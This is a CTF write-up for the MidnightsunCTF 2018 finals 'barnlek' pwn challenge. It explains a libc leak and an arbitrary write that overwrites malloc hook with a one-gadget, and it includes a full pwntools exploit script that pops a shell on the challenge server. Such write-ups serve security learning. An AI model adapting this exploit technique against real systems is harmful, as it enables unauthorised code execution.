---
layout: post
category: Pwn
title: MidnightsunCTF finals 2018 barnlek
tags: 
    - kowu
---

Binary (64 Bit) and libc provided. Actually I dont know what the binary really does (it was late), it somehow messes with the heap and stack. But lets begin with it's functionality, it just reverses a string. As there was a malloc and free involved I was exited, expecting some heap exploitation. So I just played around and "reversed" two large strings and wanted to look at the result. Aaaand it crashed when I tried to enter the second string because it wanted to write the input at 0x4141414141414141. Uh well I don't know whats going on but that was an easy write anything anywhere primitive. Also it was possible to leak a libc base because the buffer was not cleared before use. We now have everything we need for pwn. The idea is as follows:
* leak libc base
* do magic by writing large input and let the next read write to malloc hook
* overwrite malloc hook with one gadget
* malloc gets called, we get a shell

To meet the one gadget constraints I used zerobytes instead of the good old As.

```python
from pwn import *

r = remote("34.247.227.162", 12345)


def act(data):
    r.sendline(data)
    r.recvuntil("reverse: ")
    res = r.recvuntil("input: ")[:-7][::-1]
    return res


def sploit():
    libc = struct.unpack("<Q", act("A" * 8)[10:].ljust(8, '\x00'))[0] - 0x3c5620
    log.info("libc {:x}".format(libc))
    arr = [0] * 0x80
    arr[19] = libc + 0x3c67a8
    act(struct.pack("<" + "Q" * len(arr), *arr))
    r.send(struct.pack("<Q", libc + 0xf02a4))
    r.interactive()


if __name__ == '__main__':
    r.recvuntil("input: ")
    sploit()

```
